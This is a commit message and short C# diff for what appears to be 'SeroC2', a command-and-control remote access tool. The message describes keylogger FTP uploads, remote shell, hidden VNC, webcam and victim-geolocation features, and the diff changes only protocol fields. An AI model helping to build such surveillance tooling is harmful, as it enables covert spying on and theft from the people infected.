fix(i18n+geo): apply geo audit fixes, responsive layout, full i18n pass
- ServerWindow: WrapPanel for notification checkboxes (responsive, no clip)
- GeoWindow: deserialization inside Dispatcher with try/catch; BtnOpenMap
  disabled at Locate_Click start; try/catch around SendToClient (MEDIUM-1,
  LOW-2, LOW-3)
- GeoFeature.cs: null-island guard + coordinate range check (LOW-1);
  TimeoutException from WaitAsync routes to IP fallback (MEDIUM-3);
  User-Agent changed to SeroC2-geo/1.0 (LOW-4)
- Packet.cs: GeoResultData.Accuracy float->double (INFO-1)
- Lang.cs: 21 new translation keys (FM_NAME/PATH/SIZE, FM_FILE_COUNT,
  FM_CODEC_ERROR, FM_MEDIA_FAILED, FM_ERR_*, SHELL_SESSION_RECONNECTED,
  KL_FTP_*, TG_FILL_TOKEN, TG_TEST_SUCCESS) across 10 languages
- ServerWindow.xaml.cs: wire AllMenu* (35 items) to ApplyLanguage using
  existing FEAT_ keys; Telegram validation strings
- FileManagerWindow: 8 hardcoded strings replaced with Lang.Get()
- KeyloggerWindow: fix English string comparison bug with _currentFilename;
  FTP validation messages via Lang.Get()
- RemoteShellWindow: _shellOutputHasContent flag replaces English string
  comparison; reconnect countdown + session reconnected via Lang.Get()
- HvncWindow + WebcamWindow: reconnect countdown via Lang.Get()
- FunWindow: null response message via Lang.Get()

+++ server/Protocol/Packet.cs
@@ -131,7 +131,7 @@ public enum PacketType
 
     // Geolocation
     GeoRequest = 195,  // server→client: no payload
-    GeoResult  = 196,  // client→server: {Lat, Lon, Accuracy, Source, City, Country, Error}
+    GeoResult  = 196,  // client→server: {Lat, Lon, Accuracy, Source, City, Region, Country, Isp, Error}
 
     // Speaker Loopback
     SpeakerGetDevices    = 215,  // server→client: request device list
@@ -762,7 +762,7 @@ public class GeoResultData
 {
     public double Lat      { get; set; }
     public double Lon      { get; set; }
-    public float  Accuracy { get; set; }
+    public double Accuracy { get; set; }
     public string Source   { get; set; } = string.Empty;  // "ip" / "windows"
     public string City     { get; set; } = string.Empty;
     public string Region   { get; set; } = string.Empty;
